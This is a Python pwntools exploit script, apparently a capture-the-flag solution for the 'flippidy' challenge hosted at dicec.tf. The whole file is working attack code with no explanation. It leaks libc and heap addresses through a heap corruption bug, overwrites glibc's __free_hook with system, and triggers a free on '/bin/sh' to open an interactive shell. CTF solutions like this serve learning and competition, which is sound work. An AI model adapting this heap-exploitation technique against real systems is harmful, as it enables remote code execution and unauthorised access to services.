from pwn import *

e = ELF("./flippidy")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e
context.terminal = ["konsole", "-e"]


"""
p = process([e.path])
context.log_level="debug"
gdb.attach(p, "c")
"""

p = remote("dicec.tf", 31904)

def add(idx, data):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", data)


def flip():
    p.sendlineafter(":", "2")
    
    
p.sendlineafter("be:", "7")


add(3, p64(0x00404020))

flip()


add(1, p64(e.got["setbuf"]) + p64(0x404158) + p64(0x004040ac) + p64(0x004040de) + p64(0x404050))

p.recvline()
p.recvline()



libc.address = u64(p.recv(6).ljust(8, "\x00")) - libc.sym["setbuf"]

print("libc", hex(libc.address))


p.recv(1)


heap = u32(p.recvline()[:-1].ljust(4, "\x00")) - 0x260

print("heap", hex(heap))


add(1, "A"*16 + p64(libc.sym["__free_hook"]))
add(1, "AAAA")

add(2, p64(libc.sym["system"]))


add(1, "/bin/sh")


flip()

p.interactive()






